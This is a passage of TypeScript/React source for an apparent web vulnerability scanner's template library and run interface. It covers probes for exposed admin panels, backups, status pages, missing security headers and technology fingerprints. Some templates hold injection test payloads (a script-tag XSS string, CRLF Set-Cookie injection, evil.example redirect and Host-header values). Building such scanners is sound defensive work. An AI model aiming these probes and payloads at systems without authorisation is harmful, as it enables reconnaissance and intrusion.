  { id: 'graphql-playground', name: 'GraphQL Playground Exposure', severity: 'medium', category: 'exposures', tags: ['graphql','api','playground'], description: 'Detects exposed GraphQL Playground interfaces.', probe: { path: '/graphql', expect: { status: 200, body_contains_any: ['GraphQL Playground', 'graphiql'] } } },
  { id: 'graphiql', name: 'GraphiQL Interface', severity: 'medium', category: 'exposures', tags: ['graphql','api','graphiql'], description: 'GraphiQL IDE exposed.', probe: { path: '/graphiql', expect: { status: 200, body_contains: ['GraphiQL'] } } },
  { id: 'server-status', name: 'Apache server-status', severity: 'medium', category: 'exposures', tags: ['apache','status'], description: 'Detects exposed Apache server-status page.', probe: { path: '/server-status', expect: { status: 200, body_contains_any: ['Apache Server Status', 'Server Version'] } } },
  { id: 'server-info', name: 'Apache server-info', severity: 'medium', category: 'exposures', tags: ['apache','info'], description: 'Apache server-info exposed.', probe: { path: '/server-info', expect: { status: 200, body_contains: ['Server Settings'] } } },
  { id: 'nginx-status', name: 'Nginx Stub Status', severity: 'medium', category: 'exposures', tags: ['nginx','status'], description: 'Nginx stub_status module exposed.', probe: { path: '/nginx_status', expect: { status: 200, body_contains: ['Active connections'] } } },
  { id: 'cors-wildcard', name: 'CORS Wildcard Misconfiguration', severity: 'medium', category: 'misconfiguration', tags: ['cors','headers','misconfiguration'], description: 'Detects wildcard (*) CORS configuration with credentials.', probe: { path: '/', headers: { Origin: 'https://evil.example' }, expect: { header: { name: 'access-control-allow-origin', pattern: '^\\*$' } } } },
  { id: 'directory-listing', name: 'Directory Listing Enabled', severity: 'medium', category: 'misconfiguration', tags: ['directory','listing','exposure'], description: 'Directory listing is enabled, revealing file structure.', probe: { path: '/uploads/', expect: { status: 200, body_contains_any: ['Index of /', '<title>Index of'] } } },
  { id: 'admin-phpmyadmin', name: 'phpMyAdmin Detection', severity: 'medium', category: 'misconfiguration', tags: ['phpmyadmin','database','admin'], description: 'Detects exposed phpMyAdmin interface.', probe: { path: '/phpmyadmin/', expect: { status: 200, body_contains_any: ['phpMyAdmin', 'pmaPasswordField'] } } },
  { id: 'admin-adminer', name: 'Adminer Detection', severity: 'medium', category: 'misconfiguration', tags: ['adminer','database','admin'], description: 'Detects exposed Adminer database tool.', probe: { path: '/adminer.php', expect: { status: 200, body_contains: ['Adminer'] } } },
  { id: 'backup-zip', name: 'backup.zip Discovery', severity: 'medium', category: 'vulnerabilities', tags: ['backup','files','exposure'], description: 'Backup zip in webroot.', probe: { path: '/backup.zip', expect: { status: 200, header: { name: 'content-type', pattern: 'zip' } } } },
  { id: 'backup-sql', name: 'backup.sql Discovery', severity: 'high', category: 'vulnerabilities', tags: ['backup','sql','exposure'], description: 'SQL dump in webroot.', probe: { path: '/backup.sql', expect: { status: 200, body_contains_any: ['CREATE TABLE', 'INSERT INTO'] } } },
  { id: 'backup-tar-gz', name: 'backup.tar.gz Discovery', severity: 'medium', category: 'vulnerabilities', tags: ['backup','files','exposure'], description: 'Compressed backup archive in webroot.', probe: { path: '/backup.tar.gz', expect: { status: 200, header: { name: 'content-type', pattern: 'gzip|octet-stream' } } } },
  { id: 'crossdomain-xml', name: 'Flash crossdomain.xml', severity: 'medium', category: 'vulnerabilities', tags: ['flash','crossdomain','security'], description: 'Detects permissive crossdomain.xml.', probe: { path: '/crossdomain.xml', expect: { status: 200, body_contains: ['<cross-domain-policy>'] } } },
  { id: 'clientaccesspolicy', name: 'Silverlight clientaccesspolicy.xml', severity: 'medium', category: 'vulnerabilities', tags: ['silverlight','crossdomain'], description: 'Detects permissive clientaccesspolicy.xml.', probe: { path: '/clientaccesspolicy.xml', expect: { status: 200, body_contains: ['<access-policy>'] } } },
  { id: 'source-map-js', name: 'JavaScript Source Map Exposure', severity: 'medium', category: 'vulnerabilities', tags: ['javascript','sourcemap','exposure'], description: 'Detects exposed JavaScript source maps.', probe: { path: '/main.js.map', expect: { status: 200, body_contains: ['"sources"'] } } },
  { id: 'xss-reflected-basic', name: 'Reflected XSS Test', severity: 'medium', category: 'fuzzing', tags: ['xss','reflected','injection'], description: 'Tests for basic reflected XSS.', interactive: true, hint: 'Use Intruder with payload <script>alert(1)</script> — look for unescaped payload in response.' },
  { id: 'open-redirect-basic', name: 'Open Redirect Test', severity: 'medium', category: 'fuzzing', tags: ['redirect','open-redirect'], description: 'Tests for open redirect vulnerability.', interactive: true, hint: 'Use Intruder with payload https://evil.example on redirect/next/url params. Check Location header.' },
  { id: 'crlf-injection', name: 'CRLF Injection Test', severity: 'medium', category: 'fuzzing', tags: ['crlf','injection','headers'], description: 'Tests for CRLF injection in HTTP headers.', interactive: true, hint: 'Use Intruder with payload %0d%0aSet-Cookie:%20test=1 on URL/redirect params.' },
  { id: 'host-header-injection', name: 'Host Header Injection', severity: 'medium', category: 'misconfiguration', tags: ['host','header','injection'], description: 'App reflects attacker-controlled Host header into response (password-reset poisoning).', probe: { path: '/', headers: { Host: 'evil.example' }, expect: { body_contains: ['evil.example'] } } },
  { id: 'x-forwarded-host', name: 'X-Forwarded-Host Reflection', severity: 'medium', category: 'misconfiguration', tags: ['headers','injection'], description: 'X-Forwarded-Host reflected — potential cache poisoning.', probe: { path: '/', headers: { 'X-Forwarded-Host': 'evil.example' }, expect: { body_contains: ['evil.example'] } } },
  { id: 'robots-disallow', name: 'Sensitive robots.txt Entries', severity: 'info', category: 'vulnerabilities', tags: ['robots','recon','info'], description: 'Analyzes robots.txt for interesting disallowed paths.', probe: { path: '/robots.txt', expect: { status: 200, body_contains: ['Disallow'] } } },
  { id: 'security-txt', name: 'security.txt Detection', severity: 'info', category: 'vulnerabilities', tags: ['security','recon'], description: 'Detects security.txt file (RFC 9116).', probe: { path: '/.well-known/security.txt', expect: { status: 200, body_contains_any: ['Contact:', 'contact:'] } } },
  { id: 'sitemap-xml', name: 'sitemap.xml Discovery', severity: 'info', category: 'vulnerabilities', tags: ['sitemap','recon'], description: 'Discovers sitemap.xml for URL enumeration.', probe: { path: '/sitemap.xml', expect: { status: 200, body_contains: ['<urlset'] } } },
  { id: 'humans-txt', name: 'humans.txt Discovery', severity: 'info', category: 'vulnerabilities', tags: ['recon','info'], description: 'humans.txt may leak team info.', probe: { path: '/humans.txt', expect: { status: 200 } } },
  { id: 'apple-app-site-association', name: 'apple-app-site-association', severity: 'info', category: 'vulnerabilities', tags: ['ios','app'], description: 'iOS Universal Links config exposed (intended public).', probe: { path: '/.well-known/apple-app-site-association', expect: { status: 200, body_contains: ['applinks'] } } },

  // ── Low ──
  { id: 'missing-hsts', name: 'Missing HSTS Header', severity: 'low', category: 'misconfiguration', tags: ['headers','security','hsts'], description: 'HTTP Strict Transport Security header is missing.', probe: { path: '/', expect: { missing_header: 'strict-transport-security' } } },
  { id: 'missing-csp', name: 'Missing Content-Security-Policy', severity: 'low', category: 'misconfiguration', tags: ['headers','security','csp'], description: 'Content-Security-Policy header is missing.', probe: { path: '/', expect: { missing_header: 'content-security-policy' } } },
  { id: 'missing-x-frame-options', name: 'Missing X-Frame-Options', severity: 'low', category: 'misconfiguration', tags: ['headers','security','clickjacking'], description: 'X-Frame-Options header is missing (or CSP frame-ancestors).', probe: { path: '/', expect: { missing_header: 'x-frame-options' } } },
  { id: 'missing-xcto', name: 'Missing X-Content-Type-Options', severity: 'low', category: 'misconfiguration', tags: ['headers','security'], description: 'X-Content-Type-Options: nosniff header missing.', probe: { path: '/', expect: { missing_header: 'x-content-type-options' } } },
  { id: 'missing-referrer-policy', name: 'Missing Referrer-Policy', severity: 'low', category: 'misconfiguration', tags: ['headers','privacy'], description: 'Referrer-Policy header missing.', probe: { path: '/', expect: { missing_header: 'referrer-policy' } } },
  { id: 'missing-permissions-policy', name: 'Missing Permissions-Policy', severity: 'low', category: 'misconfiguration', tags: ['headers','privacy'], description: 'Permissions-Policy header missing.', probe: { path: '/', expect: { missing_header: 'permissions-policy' } } },
  { id: 'server-header-leak', name: 'Server Header Version Leak', severity: 'low', category: 'misconfiguration', tags: ['headers','info'], description: 'Server header leaks software version.', probe: { path: '/', expect: { header: { name: 'server', pattern: '\\d' } } } },
  { id: 'x-powered-by', name: 'X-Powered-By Header Leak', severity: 'low', category: 'misconfiguration', tags: ['headers','info'], description: 'X-Powered-By header leaks framework.', probe: { path: '/', expect: { header: { name: 'x-powered-by' } } } },
  { id: 'error-page-disclosure', name: 'Error Page Information Disclosure', severity: 'low', category: 'vulnerabilities', tags: ['error','information','disclosure'], description: 'Detects verbose error pages leaking stack traces or paths.', probe: { path: '/__not__exists__/' + Math.random().toString(36).slice(2), expect: { status: 500, body_contains_any: ['Exception', 'Traceback', 'Stack trace', 'at java.', 'at System.'] } } },

  // ── Info ──
  { id: 'options-method', name: 'HTTP OPTIONS Method Enabled', severity: 'info', category: 'misconfiguration', tags: ['http','methods','options'], description: 'HTTP OPTIONS method is enabled.', probe: { path: '/', method: 'OPTIONS', expect: { header: { name: 'allow' } } } },
  { id: 'trace-method', name: 'HTTP TRACE Method Enabled', severity: 'medium', category: 'misconfiguration', tags: ['http','methods','trace'], description: 'HTTP TRACE method enabled — XST risk.', probe: { path: '/', method: 'OPTIONS', expect: { header: { name: 'allow', pattern: 'TRACE' } } } },
  { id: 'tech-wordpress', name: 'WordPress Detection', severity: 'info', category: 'technologies', tags: ['wordpress','cms','tech'], description: 'Detects WordPress CMS installations.', probe: { path: '/', expect: { body_contains_any: ['wp-content', 'wp-includes', '/wp-json/'] } } },
  { id: 'tech-joomla', name: 'Joomla Detection', severity: 'info', category: 'technologies', tags: ['joomla','cms','tech'], description: 'Detects Joomla CMS installations.', probe: { path: '/', expect: { body_contains_any: ['/components/com_', 'Joomla!', '/media/jui/'] } } },
  { id: 'tech-drupal', name: 'Drupal Detection', severity: 'info', category: 'technologies', tags: ['drupal','cms','tech'], description: 'Detects Drupal CMS installations.', probe: { path: '/', expect: { body_contains_any: ['Drupal.settings', 'sites/all/', 'X-Drupal-Cache'] } } },
  { id: 'tech-laravel', name: 'Laravel Detection', severity: 'info', category: 'technologies', tags: ['laravel','php','framework'], description: 'Detects Laravel PHP framework via XSRF-TOKEN cookie.', probe: { path: '/', expect: { header: { name: 'set-cookie', pattern: 'XSRF-TOKEN|laravel_session' } } } },
  { id: 'tech-nextjs', name: 'Next.js Detection', severity: 'info', category: 'technologies', tags: ['nextjs','javascript','framework'], description: 'Detects Next.js React framework.', probe: { path: '/', expect: { body_contains_any: ['__NEXT_DATA__', '_next/static'] } } },
  { id: 'tech-nuxtjs', name: 'Nuxt.js Detection', severity: 'info', category: 'technologies', tags: ['nuxtjs','vue','framework'], description: 'Detects Nuxt.js Vue framework.', probe: { path: '/', expect: { body_contains_any: ['__NUXT__', '_nuxt/'] } } },
  { id: 'tech-django', name: 'Django Detection', severity: 'info', category: 'technologies', tags: ['django','python','framework'], description: 'Detects Django Python framework.', probe: { path: '/', expect: { body_contains_any: ['csrfmiddlewaretoken', 'django'] } } },
  { id: 'tech-rails', name: 'Ruby on Rails Detection', severity: 'info', category: 'technologies', tags: ['rails','ruby','framework'], description: 'Detects Ruby on Rails framework.', probe: { path: '/', expect: { header: { name: 'x-powered-by', pattern: 'Phusion Passenger' } } } },
  { id: 'tech-express', name: 'Express.js Detection', severity: 'info', category: 'technologies', tags: ['express','node','framework'], description: 'Express.js framework via X-Powered-By header.', probe: { path: '/', expect: { header: { name: 'x-powered-by', pattern: 'Express' } } } },
  { id: 'tech-fastapi', name: 'FastAPI Detection', severity: 'info', category: 'technologies', tags: ['fastapi','python','framework'], description: 'FastAPI Python framework.', probe: { path: '/docs', expect: { status: 200, body_contains: ['Swagger UI'] } } },
  { id: 'tech-flask', name: 'Flask Detection', severity: 'info', category: 'technologies', tags: ['flask','python','framework'], description: 'Flask debugger / cookie detection.', probe: { path: '/', expect: { header: { name: 'set-cookie', pattern: 'session=eyJ' } } } },
  { id: 'tech-aspnet', name: 'ASP.NET Detection', severity: 'info', category: 'technologies', tags: ['aspnet','dotnet','framework'], description: 'ASP.NET via X-AspNet-Version header.', probe: { path: '/', expect: { header: { name: 'x-aspnet-version' } } } },
  { id: 'waf-cloudflare', name: 'Cloudflare WAF Detection', severity: 'info', category: 'technologies', tags: ['waf','cloudflare','cdn'], description: 'Detects Cloudflare WAF/CDN protection.', probe: { path: '/', expect: { header: { name: 'server', pattern: 'cloudflare' } } } },
  { id: 'waf-akamai', name: 'Akamai WAF Detection', severity: 'info', category: 'technologies', tags: ['waf','akamai','cdn'], description: 'Detects Akamai WAF/CDN protection.', probe: { path: '/', expect: { header: { name: 'server', pattern: 'AkamaiGHost' } } } },
  { id: 'waf-imperva', name: 'Imperva Incapsula', severity: 'info', category: 'technologies', tags: ['waf','imperva'], description: 'Imperva Incapsula via cookie / header.', probe: { path: '/', expect: { header: { name: 'set-cookie', pattern: 'visid_incap|incap_ses' } } } },
  { id: 'waf-sucuri', name: 'Sucuri WAF Detection', severity: 'info', category: 'technologies', tags: ['waf','sucuri'], description: 'Sucuri WAF.', probe: { path: '/', expect: { header: { name: 'server', pattern: 'Sucuri' } } } },
  { id: 'admin-panel-login', name: 'Admin Panel Detection', severity: 'info', category: 'misconfiguration', tags: ['admin','panel','login'], description: 'Detects common /admin login page.', probe: { path: '/admin', expect: { status: 200, body_contains_any: ['Login', 'Password', 'login-form'] } } },
  { id: 'admin-panel-administrator', name: '/administrator Detection', severity: 'info', category: 'misconfiguration', tags: ['admin','panel','login'], description: 'Joomla /administrator panel.', probe: { path: '/administrator/', expect: { status: 200, body_contains_any: ['Joomla', 'Login'] } } },
];

const CATEGORIES = ['all', 'exposures', 'misconfiguration', 'cves', 'vulnerabilities', 'default-logins', 'takeovers', 'technologies', 'fuzzing'];
const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info'] as const;

const severityOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

function joinUrl(base: string, path: string): string {
  if (!base) return path;
  try {
    const u = new URL(base);
    if (path.startsWith('http://') || path.startsWith('https://')) return path;
    const basePath = u.pathname.replace(/\/+$/, '');
    const sub = path.startsWith('/') ? path : `/${path}`;
    u.pathname = (basePath + sub) || sub;
    return u.toString();
  } catch {
    if (path.startsWith('http://') || path.startsWith('https://')) return path;
    const cleaned = base.replace(/\/+$/, '');
    const sub = path.startsWith('/') ? path : `/${path}`;
    return cleaned + sub;
  }
}

function findHeaderValue(headersBlob: string, name: string): string | null {
  const lower = name.toLowerCase();
  for (const line of headersBlob.split(/\r?\n/)) {
    const idx = line.indexOf(':');
    if (idx <= 0) continue;
    if (line.slice(0, idx).trim().toLowerCase() === lower) {
      return line.slice(idx + 1).trim();
    }
  }
  return null;
}

function evaluateProbe(probe: Probe, resp: HttpResponseLike): { ok: boolean; reason: string } {
  const exp = probe.expect;

  if (exp.status !== undefined) {
    const expected = Array.isArray(exp.status) ? exp.status : [exp.status];
    if (!expected.includes(resp.status)) {
      return { ok: false, reason: `status ${resp.status} not in [${expected.join(',')}]` };
    }
  }
  if (exp.not_status) {
    if (exp.not_status.includes(resp.status)) {
      return { ok: false, reason: `status ${resp.status} in excluded list` };
    }
  }
  if (exp.min_body_size !== undefined && resp.size < exp.min_body_size) {
    return { ok: false, reason: `body too small (${resp.size} < ${exp.min_body_size})` };
  }
  if (exp.body_contains) {
    for (const needle of exp.body_contains) {
      if (!resp.body.includes(needle)) {
        return { ok: false, reason: `body missing "${needle}"` };
      }
    }
  }
  if (exp.body_contains_any) {
    const ok = exp.body_contains_any.some(n => resp.body.includes(n));
    if (!ok) {
      return { ok: false, reason: `body missing all of [${exp.body_contains_any.map(s => '"'+s+'"').join(', ')}]` };
    }
  }
  if (exp.body_not_contains) {
    for (const bad of exp.body_not_contains) {
      if (resp.body.toLowerCase().includes(bad.toLowerCase())) {
        return { ok: false, reason: `body contains forbidden "${bad}"` };
      }
    }
  }
  if (exp.body_regex) {
    try {
      const re = new RegExp(exp.body_regex, 'm');
      if (!re.test(resp.body)) return { ok: false, reason: `body did not match /${exp.body_regex}/` };
    } catch {
      return { ok: false, reason: 'invalid regex' };
    }
  }
  if (exp.header) {
    const v = findHeaderValue(resp.headers, exp.header.name);
    if (v === null) return { ok: false, reason: `missing header ${exp.header.name}` };
    if (exp.header.pattern) {
      try {
        if (!new RegExp(exp.header.pattern, 'i').test(v)) {
          return { ok: false, reason: `header ${exp.header.name}="${v}" did not match /${exp.header.pattern}/` };
        }
      } catch {
        return { ok: false, reason: 'invalid header regex' };
      }
    }
  }
  if (exp.missing_header) {
    const v = findHeaderValue(resp.headers, exp.missing_header);
    if (v !== null) return { ok: false, reason: `header ${exp.missing_header} present ("${v}")` };
  }
  return { ok: true, reason: 'all expectations matched' };
}

async function runProbe(target: string, probe: Probe, timeoutMs = 15000): Promise<{ resp?: HttpResponseLike; error?: string; url: string }> {
  const { invoke } = await import('@tauri-apps/api/core');
  const url = joinUrl(target, probe.path);
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const resp = await invoke<HttpResponseLike>('send_http_request', {
        method: probe.method || 'GET',
        url,
        headers: probe.headers ?? null,
        body: probe.body ?? null,
      });
      return { resp, url };
    } finally {
      clearTimeout(timer);
    }
  } catch (e: any) {
    return { error: String(e?.message || e), url };
  }
}

function severityBg(sev: Template['severity']): string {
  return ({ critical: '#dc2626', high: '#f97316', medium: '#eab308', low: '#3b82f6', info: '#6b7280' } as const)[sev];
}

export function Templates() {
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('all');
  const [severity, setSeverity] = useState<string | null>(null);
  const [selected, setSelected] = useState<Template | null>(null);
  const [view, setView] = useState<'grid' | 'table'>('grid');
  const [target, setTarget] = useState<string>(() => {
    try { return localStorage.getItem('ws-templates-target') || ''; } catch { return ''; }
  });
  const [results, setResults] = useState<Record<string, RunResult>>({});
  const [isBulkRunning, setIsBulkRunning] = useState(false);
  const [onlyShowHits, setOnlyShowHits] = useState(false);
  const bulkCancel = useRef<{ cancelled: boolean }>({ cancelled: false });

  useEffect(() => {
    try { localStorage.setItem('ws-templates-target', target); } catch {}
  }, [target]);

  const filtered = useMemo(() => {
    let list = TEMPLATES;
    if (category !== 'all') list = list.filter(t => t.category === category);
    if (severity) list = list.filter(t => t.severity === severity);
    if (search) {
      const q = search.toLowerCase();
      list = list.filter(t =>
        t.id.toLowerCase().includes(q) ||
        t.name.toLowerCase().includes(q) ||
        t.description.toLowerCase().includes(q) ||
        t.tags.some(tag => tag.includes(q))
      );
    }
    if (onlyShowHits) list = list.filter(t => results[t.id]?.status === 'hit');
    return list.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);
  }, [search, category, severity, onlyShowHits, results]);

  const stats = useMemo(() => {
    const counts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    TEMPLATES.forEach(t => counts[t.severity]++);
    return counts;
  }, []);

  const runStats = useMemo(() => {
    let hit = 0, miss = 0, err = 0, pending = 0;
    for (const r of Object.values(results)) {
      if (r.status === 'hit') hit++;
      else if (r.status === 'miss') miss++;
      else if (r.status === 'error') err++;
      else if (r.status === 'pending') pending++;
    }
    return { hit, miss, err, pending };
  }, [results]);

  const runOne = useCallback(async (t: Template) => {
    if (!t.probe) return;
    if (!target.trim()) return;
    setResults(prev => ({ ...prev, [t.id]: { status: 'pending' } }));
    const { resp, error, url } = await runProbe(target.trim(), t.probe);
    if (error) {
      setResults(prev => ({ ...prev, [t.id]: { status: 'error', error, matched_url: url, finished_at: Date.now() } }));
      return;
    }
    if (!resp) {
      setResults(prev => ({ ...prev, [t.id]: { status: 'error', error: 'no response', matched_url: url, finished_at: Date.now() } }));
      return;
    }
    const { ok, reason } = evaluateProbe(t.probe, resp);
    setResults(prev => ({
      ...prev,
      [t.id]: { status: ok ? 'hit' : 'miss', resp, reason, matched_url: url, finished_at: Date.now() }
    }));
  }, [target]);

  const runAll = useCallback(async () => {
    if (!target.trim()) return;
    bulkCancel.current.cancelled = false;
    setIsBulkRunning(true);
    const runnables = filtered.filter(t => t.probe && !t.interactive);
    const concurrency = 6;
    const queue = [...runnables];
    setResults(prev => {
      const next = { ...prev };
      for (const t of runnables) next[t.id] = { status: 'pending' };
      return next;
    });
    const workers = new Array(concurrency).fill(0).map(async () => {
      while (queue.length > 0) {
        if (bulkCancel.current.cancelled) return;
        const t = queue.shift();
        if (!t) return;
        await runOne(t);
      }
    });
    await Promise.all(workers);
    setIsBulkRunning(false);
  }, [filtered, runOne, target]);

  const cancelRun = useCallback(() => {
    bulkCancel.current.cancelled = true;
    setIsBulkRunning(false);
  }, []);

  const clearResults = useCallback(() => {
    setResults({});
  }, []);

  const sendToFindings = useCallback(async (t: Template, r: RunResult) => {
    try {
      const { emit } = await import('@tauri-apps/api/event');
      const url = r.matched_url || target;
      const path = (() => { try { return new URL(url).pathname; } catch { return t.probe?.path || '/'; } })();
      const evidence = r.resp ? `HTTP/1.1 ${r.resp.status}\n${r.resp.headers}\n\n${r.resp.body.slice(0, 4000)}` : '';
      await emit('scanner-finding', {
        id: `template-${t.id}-${Date.now()}`,
        title: t.name,
        severity: t.severity,
        confidence: 'firm',
        url,
        path,
        description: t.description,
        remediation: t.remediation || 'Restrict access or remove the exposed resource.',
        evidence,
        foundAt: new Date().toISOString(),
        status: 'new',
      });
    } catch (e) {
      console.error('Failed to send to findings', e);
    }
  }, [target]);

  const copyAsCurl = useCallback(async (t: Template) => {
    if (!t.probe || !target.trim()) return;
    const url = joinUrl(target.trim(), t.probe.path);
    const m = (t.probe.method || 'GET').toUpperCase();
    let cmd = `curl -i -X ${m} "${url}"`;
    if (t.probe.headers) for (const [k, v] of Object.entries(t.probe.headers)) cmd += ` -H "${k}: ${v}"`;
    if (t.probe.body) cmd += ` --data-raw '${t.probe.body.replace(/'/g, "'\\''")}'`;
    try { await navigator.clipboard.writeText(cmd); } catch {}
  }, [target]);

  const sendToRepeater = useCallback(async (t: Template) => {
    if (!t.probe || !target.trim()) return;
    const url = joinUrl(target.trim(), t.probe.path);
    try {
      const { emit } = await import('@tauri-apps/api/event');
      await emit('open-in-repeater', {
        method: t.probe.method || 'GET',
        url,
        headers: t.probe.headers || {},
        body: t.probe.body || '',
      });
    } catch (e) {
      console.error('Failed to send to repeater', e);
    }
  }, [target]);

  const ResultBadge = ({ r }: { r?: RunResult }) => {
    if (!r) return null;
    if (r.status === 'pending') return <span className="template-result pending"><Loader2 size={10} className="tmpl-spin" /> running</span>;
    if (r.status === 'hit') return <span className="template-result hit"><CheckCircle2 size={10} /> hit{r.resp ? ` · ${r.resp.status}` : ''}</span>;
    if (r.status === 'miss') return <span className="template-result miss"><XCircle size={10} /> miss{r.resp ? ` · ${r.resp.status}` : ''}</span>;
    if (r.status === 'error') return <span className="template-result err"><AlertTriangle size={10} /> error</span>;
    return null;
  };

  return (
    <div className="templates">
      {/* ── Run Bar ─── */}
      <div className="templates-runbar">
        <div className="templates-target">
          <span className="templates-target-label">TARGET</span>
          <input
            type="url"
            placeholder="https://example.com  ← base URL probes are appended to"
            value={target}
            onChange={e => setTarget(e.target.value)}
          />
        </div>

        {isBulkRunning ? (
          <button className="templates-run-all-btn cancel" onClick={cancelRun}>
            <XCircle size={11} /> Cancel ({runStats.pending} pending)
          </button>
        ) : (
          <button
            className="templates-run-all-btn"
            disabled={!target.trim() || filtered.filter(t => t.probe && !t.interactive).length === 0}
            onClick={runAll}
          >
            <Play size={11} /> Run {filtered.filter(t => t.probe && !t.interactive).length} filtered
          </button>
        )}

        {Object.keys(results).length > 0 && (
          <>
            <button
              className={`templates-toggle-hits ${onlyShowHits ? 'active' : ''}`}
              onClick={() => setOnlyShowHits(v => !v)}
              title="Show only templates that matched"
            >
              <CheckCircle2 size={11} /> Hits only ({runStats.hit})
            </button>
            <button className="templates-clear-btn" onClick={clearResults} title="Clear all results">
              <Eraser size={11} /> Clear
            </button>
          </>
        )}

        {Object.keys(results).length > 0 && (
          <div className="templates-runstats">
            <span className="rs-hit">{runStats.hit} hit</span>
            <span className="rs-miss">{runStats.miss} miss</span>
            {runStats.err > 0 && <span className="rs-err">{runStats.err} err</span>}
          </div>
        )}
      </div>

      {/* ── Toolbar ─── */}
      <div className="templates-toolbar">
        <div className="templates-search">
          <Search size={12} />
          <input
            placeholder="Search templates (CVE, tag, name…)"
            value={search}
            onChange={e => setSearch(e.target.value)}
          />
        </div>

        <div className="templates-pills">
          {CATEGORIES.map(cat => (
            <button
              key={cat}
              className={`templates-pill ${category === cat ? 'active' : ''}`}
              onClick={() => setCategory(cat)}
            >
              {cat === 'all' ? 'All' : cat.replace('-', ' ')}
            </button>
          ))}
        </div>

        <div className="templates-severity-pills">
          {SEVERITIES.map(sev => (
            <button
              key={sev}
              className={`severity-pill ${severity === sev ? 'active' : ''}`}
              data-sev={sev}
              onClick={() => setSeverity(severity === sev ? null : sev)}
            >
              {sev}
            </button>
          ))}
        </div>
      </div>

      {/* ── Stats Bar ─── */}
      <div className="templates-stats">
        <span className="templates-stat">
          <FileCode2 size={10} />
          <span className="templates-stat-value">{filtered.length}</span> / {TEMPLATES.length} templates
        </span>
        <span className="templates-stat">
          <span className="templates-stat-dot" style={{ background: '#ef4444' }} />
          <span className="templates-stat-value">{stats.critical}</span> critical
        </span>
        <span className="templates-stat">
          <span className="templates-stat-dot" style={{ background: '#f97316' }} />
          <span className="templates-stat-value">{stats.high}</span> high
        </span>
        <span className="templates-stat">
          <span className="templates-stat-dot" style={{ background: '#eab308' }} />
          <span className="templates-stat-value">{stats.medium}</span> medium
        </span>
        <span className="templates-stat">
          <span className="templates-stat-dot" style={{ background: '#3b82f6' }} />
          <span className="templates-stat-value">{stats.low}</span> low
        </span>
        <span className="templates-stat">
          <span className="templates-stat-dot" style={{ background: '#6b7280' }} />
          <span className="templates-stat-value">{stats.info}</span> info
        </span>

        <div style={{ marginLeft: 'auto' }}>
          <div className="templates-view-toggle">
            <button className={`templates-view-btn ${view === 'grid' ? 'active' : ''}`} onClick={() => setView('grid')}>
              <Grid3X3 size={10} /> Grid
            </button>
            <button className={`templates-view-btn ${view === 'table' ? 'active' : ''}`} onClick={() => setView('table')}>
              <List size={10} /> Table
            </button>
          </div>
        </div>
      </div>

      {/* ── Content ─── */}
      <div className="templates-content">
        {filtered.length === 0 ? (
          <div className="templates-empty">
            <Shield size={40} />
            <div className="templates-empty-title">No templates found</div>
            <div className="templates-empty-desc">
              Try adjusting your search or filters. The template library contains {TEMPLATES.length} built-in vulnerability detection templates.
            </div>
          </div>
        ) : view === 'grid' ? (
          <div className="templates-grid">
            {filtered.map(t => {
              const r = results[t.id];
              const isHit = r?.status === 'hit';
              return (
                <div
                  key={t.id}
                  className={`template-card ${isHit ? 'is-hit' : ''}`}
                  onClick={() => setSelected(selected?.id === t.id ? null : t)}
                  style={selected?.id === t.id ? { borderColor: 'var(--accent)' } : isHit ? { borderColor: severityBg(t.severity) } : undefined}
                >
                  <div className="template-card-header">
                    <span className="template-card-severity" data-sev={t.severity}>{t.severity}</span>
                    <div className="template-card-title">{t.name}</div>
                    {r && (
                      <div className="template-card-result-corner">
                        <ResultBadge r={r} />
                      </div>
                    )}
                  </div>
                  <div className="template-card-id">{t.id}</div>
                  <div className="template-card-desc">{t.description}</div>
                  <div className="template-card-footer">
                    {t.tags.slice(0, 3).map(tag => (
                      <span key={tag} className="template-card-tag">{tag}</span>
                    ))}
                    {t.tags.length > 3 && <span className="template-card-tag">+{t.tags.length - 3}</span>}
                    <span className="template-card-category">{t.category}</span>
                  </div>
                  <div className="template-card-actions" onClick={e => e.stopPropagation()}>
                    {t.probe && !t.interactive ? (
                      <button
                        className="tmpl-action-btn run"
                        disabled={!target.trim() || r?.status === 'pending'}
                        onClick={() => runOne(t)}
                        title="Run probe against target"
                      >
                        {r?.status === 'pending' ? <Loader2 size={10} className="tmpl-spin" /> : <Play size={10} />} Run
                      </button>
                    ) : (
                      <span className="tmpl-action-interactive" title={t.hint || 'Requires manual setup'}>
                        <BookOpen size={10} /> manual
                      </span>
                    )}
                    {t.probe && (
                      <>
                        <button className="tmpl-action-btn" onClick={() => sendToRepeater(t)} disabled={!target.trim()} title="Send to Repeater">
                          <ExternalLink size={10} /> Repeater
                        </button>
                        <button className="tmpl-action-btn" onClick={() => copyAsCurl(t)} disabled={!target.trim()} title="Copy as curl">
                          <Copy size={10} /> curl
                        </button>
                      </>
                    )}
                    {isHit && (
                      <button className="tmpl-action-btn send" onClick={() => sendToFindings(t, r!)} title="Send to Findings">
                        <Send size={10} /> Finding
                      </button>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        ) : (
          <table className="templates-table">
            <thead>
              <tr>
                <th className="col-severity">Severity</th>
                <th className="col-id">Template ID</th>
                <th>Name</th>
                <th className="col-category">Category</th>
                <th className="col-result">Result</th>
                <th className="col-actions">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map(t => {
                const r = results[t.id];
                return (
                  <tr
                    key={t.id}
                    className={selected?.id === t.id ? 'selected' : ''}
                    onClick={() => setSelected(selected?.id === t.id ? null : t)}
                  >
                    <td><span className="template-card-severity" data-sev={t.severity}>{t.severity}</span></td>
                    <td className="col-id">{t.id}</td>
                    <td>{t.name}</td>
                    <td>{t.category}</td>
                    <td><ResultBadge r={r} /></td>
                    <td className="col-actions" onClick={e => e.stopPropagation()}>
                      {t.probe && !t.interactive ? (
                        <button
                          className="tmpl-action-btn run small"
                          disabled={!target.trim() || r?.status === 'pending'}
                          onClick={() => runOne(t)}
                        >
                          {r?.status === 'pending' ? <Loader2 size={10} className="tmpl-spin" /> : <Play size={10} />}
                        </button>
                      ) : (
                        <span className="tmpl-action-interactive small" title={t.hint || 'Manual setup required'}>
                          <BookOpen size={10} />
                        </span>
                      )}
                      {r?.status === 'hit' && (
